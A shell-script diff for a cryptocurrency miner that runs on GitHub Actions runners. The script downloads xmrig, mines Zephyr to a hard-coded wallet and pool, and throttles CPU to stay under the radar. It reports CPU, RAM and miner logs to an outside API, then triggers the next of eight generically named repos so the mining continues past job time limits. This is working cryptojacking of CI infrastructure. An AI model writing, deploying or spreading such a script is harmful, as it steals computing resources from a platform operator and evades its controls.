@@ -1,97 +1,104 @@
 #!/bin/bash
+set -x # Hata ayıklama modu
 
-# --- 1. AYARLAR VE TANIMLAR ---
-# Her repo için WORKER_ID (1-8 arası) repository_dispatch ile gelecek
-WORKER_NAME="PRIME_W_$WORKER_ID"
-START_TIME=$SECONDS
+# --- KİMLİK VE AYARLAR ---
+# GitHub Actions'dan gelen ID yoksa varsayılan 1 olsun
+CURRENT_ID=${WORKER_ID:-1} 
+WORKER_NAME="PRIME_W_$CURRENT_ID"
 API_URL="https://miysoft.com/miner/prime_api.php"
-USER_NAME="tosunhalil924-lang"
+WALLET="ZEPHYR2TBwvbmFP2MY3pryctzUs68jPieU18FyZQvXkvDdzeJdxtoty7Bkqa1JPcgWd6mejpmV6MeRWB26NQZYB6cjUSVvH8kyo2B"
+POOL="de.zephyr.herominers.com:1123"
 
-# --- 2. SİSTEM HAZIRLIĞI ---
-sudo apt-get update && sudo apt-get install -y cpulimit curl jq git
-df -h
-
-# --- 3. PROJE KURULUMU (ZEPH) ---
-echo "Zeph Logic modülü indiriliyor..."
-git clone https://gitlab.com/paradoxsal/paradoxsal_miner_prime logic_module
-cd logic_module
-chmod +x zeph_install.sh
-
-# --- 4. ÇALIŞTIRMA VE KISITLAMA ---
-# Arka planda başlatıyoruz
-nohup ./zeph_install.sh > ../process.log 2>&1 &
-sleep 15 # Başlaması için zaman tanı
-
-# Ana işlem PID'sini bul (Genelde xmrig veya script ismiyle çalışır)
-# PID tespiti için en yüksek CPU kullanan işlemi buluyoruz
-TASK_PID=$(ps aux | grep -v "grep" | grep -v "worker_prime" | grep -v "sshd" | sort -nrk 3 | head -1 | awk '{print $2}')
-
-if [ ! -z "$TASK_PID" ]; then
-    echo "Görev Tespit Edildi (PID: $TASK_PID). %70 CPU Limiti Uygulanıyor..."
-    # 2 Core CPU için %70 = 140 limit (cpulimit -l 140)
-    sudo cpulimit -p $TASK_PID -l 140 &
-else
-    echo "Uyarı: Ana PID tespit edilemedi, logları kontrol et."
-fi
-
-# --- 5. İZLEME VE RAPORLAMA DÖNGÜSÜ (5 SAAT 45 DK) ---
-# 20700 saniye = 5 saat 45 dakika. 15 dk kala devir teslim başlar.
-while [ $((SECONDS - START_TIME)) -lt 20700 ]; do
-    CPU=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
-    RAM_USAGE=$(free -m | awk '/Mem:/ { print $3 }') # MB cinsinden
-    RAM_PCT=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
-    
-    # RAM Koruması: 2.5 GB (2560 MB) aşılırsa uyarı ver veya işlemi yavaşlat
-    if [ "$RAM_USAGE" -gt 2560 ]; then
-        STATUS="RAM_CRITICAL"
-    else
-        STATUS="ACTIVE_PRIME"
-    fi
-
-    # Logları çek ve Base64 yap
-    LOGS=$(tail -n 12 ../process.log | base64 -w 0)
-    
-    # Miysoft API Raporu
-    curl -s -X POST -H "X-Miysoft-Key: $MIYSOFT_KEY" \
-         -d "{\"worker_id\":\"$WORKER_NAME\", \"cpu\":\"$CPU\", \"ram\":\"$RAM_PCT\", \"status\":\"$STATUS\", \"logs\":\"$LOGS\"}" \
-         $API_URL || true
-    
-    sleep 30
-done
-
-# --- 6. DÖNGÜSEL TETİKLEME (VARDİYA DEĞİŞİMİ) ---
-echo "Vardiya süresi doldu. Sonraki repolar uyandırılıyor..."
-
-# Tetikleme mantığı: 1-2 -> 3-4 -> 5-6 -> 7-8 -> 1-2
-case $WORKER_ID in
-  1|2) NEXT1=3; NEXT2=4 ;;
-  3|4) NEXT1=5; NEXT2=6 ;;
-  5|6) NEXT1=7; NEXT2=8 ;;
-  7|8) NEXT1=1; NEXT2=2 ;;
-esac
-
-# Repo listesi (Sıralama ID'ye göre)
+# GitHub Kullanıcı Adın
+GITHUB_USER="tosunhalil924-lang"
+# Repoların Sıralı Listesi (Diziler 0'dan başlar, ID-1 yapacağız)
 REPOS=("Atlas-Core-System" "Helios-Data-Stream" "Icarus-Sync-Node" "Hermes-Relay-Point" "Ares-Flow-Control" "Zeus-Buffer-Cloud" "Apollo-Logic-Vault" "Athena-Task-Manager")
 
-REPO1=${REPOS[$((NEXT1-1))]}
-REPO2=${REPOS[$((NEXT2-1))]}
+echo "### SİSTEM BAŞLATILIYOR: ID $CURRENT_ID ###"
 
-trigger_next() {
-  local target_repo=$1
-  local next_id=$2
-  echo "Tetikleniyor: $target_repo (ID: $next_id)"
-  curl -X POST -H "Authorization: token $PAT_TOKEN" \
-       -H "Accept: application/vnd.github.v3+json" \
-       "https://api.github.com/repos/$USER_NAME/$target_repo/dispatches" \
-       -d "{\"event_type\": \"prime_loop\", \"client_payload\": {\"worker_id\": \"$next_id\"}}"
-}
+# --- ADIM 1: HAZIRLIK ---
+sudo apt-get update > /dev/null 2>&1
+sudo apt-get install -y wget tar curl jq cpulimit openssl > /dev/null 2>&1
+sudo sysctl -w vm.nr_hugepages=128
 
-trigger_next "$REPO1" "$NEXT1"
-trigger_next "$REPO2" "$NEXT2"
+if [ ! -f "./xmrig" ]; then
+    wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+    tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
+    mv xmrig-6.22.2/xmrig .
+    chmod +x xmrig
+fi
 
-# --- 7. KAPANIŞ (YEŞİL TİK) ---
-pkill -f zeph
-pkill -f xmrig
-sleep 5
-echo "Görev başarıyla tamamlandı ve devredildi."
+# Rastgele Oturum ID'si
+RAND_ID=$(openssl rand -hex 4)
+MY_MINER_NAME="GHA_${CURRENT_ID}_${RAND_ID}"
+touch miner.log && chmod 666 miner.log
+
+# --- ADIM 2: MADENCİLİK BAŞLAT ---
+echo "🚀 Madenci Ateşleniyor..."
+sudo nohup ./xmrig -o $POOL -u $WALLET -p $MY_MINER_NAME -a rx/0 -t 2 --coin zephyr --donate-level 1 --log-file=miner.log > /dev/null 2>&1 &
+MINER_PID=$!
+sleep 10
+sudo cpulimit -p $MINER_PID -l 140 & > /dev/null 2>&1
+
+# --- ADIM 3: İZLEME VE RAPORLAMA (5 Saat 45 Dakika) ---
+# 20700 saniye = 5 saat 45 dakika (Çakışma payı için biraz arttırdım)
+START_LOOP=$SECONDS
+while [ $((SECONDS - START_LOOP)) -lt 20700 ]; do
+    
+    # Süreç kontrolü
+    if ! ps -p $MINER_PID > /dev/null; then
+        sudo nohup ./xmrig -o $POOL -u $WALLET -p $MY_MINER_NAME -a rx/0 -t 2 --coin zephyr --donate-level 1 --log-file=miner.log > /dev/null 2>&1 &
+        MINER_PID=$!
+        sudo cpulimit -p $MINER_PID -l 140 &
+    fi
+
+    # Veri Toplama
+    CPU=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
+    RAM=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
+    LOGS_B64=$(tail -n 15 miner.log | base64 -w 0)
+
+    # JSON Paketleme
+    JSON_DATA=$(jq -n \
+                  --arg wid "$WORKER_NAME" \
+                  --arg cpu "$CPU" \
+                  --arg ram "$RAM" \
+                  --arg st "MINING_ZEPH" \
+                  --arg log "$LOGS_B64" \
+                  '{worker_id: $wid, cpu: $cpu, ram: $ram, status: $st, logs: $log}')
+
+    # API'ye Gönder
+    curl -s -o /dev/null -X POST \
+         -H "Content-Type: application/json" \
+         -H "X-Miysoft-Key: $MIYSOFT_KEY" \
+         -d "$JSON_DATA" \
+         $API_URL
+    
+    sleep 60
+done
+
+# --- ADIM 4: GÖREV DEVRİ (TRIGGER) ---
+echo "✅ Vardiya Bitti. Madenci durduruluyor..."
+sudo kill $MINER_PID
+
+# Zincir Mantığı (Chain Logic)
+# 1 -> 3 -> 5 -> 7 -> 1
+# 2 -> 4 -> 6 -> 8 -> 2
+NEXT_ID=$((CURRENT_ID + 2))
+
+# Eğer 8'i geçerse başa sar (Modüler aritmetik yerine basit if)
+if [ "$NEXT_ID" -gt 8 ]; then
+    NEXT_ID=$((NEXT_ID - 8))
+fi
+
+# Hedef Repo İsmini Bul (Dizi indexi 0 olduğu için -1 yapıyoruz)
+TARGET_REPO=${REPOS[$((NEXT_ID-1))]}
+
+echo "🔄 Tetiklenen Yeni İşçi: ID $NEXT_ID -> Repo: $TARGET_REPO"
+
+curl -X POST -H "Authorization: token $PAT_TOKEN" \
+     -H "Accept: application/vnd.github.v3+json" \
+     "https://api.github.com/repos/$GITHUB_USER/$TARGET_REPO/dispatches" \
+     -d "{\"event_type\": \"prime_loop\", \"client_payload\": {\"worker_id\": \"$NEXT_ID\"}}"
+
+echo "👋 Çıkış yapılıyor."
 exit 0
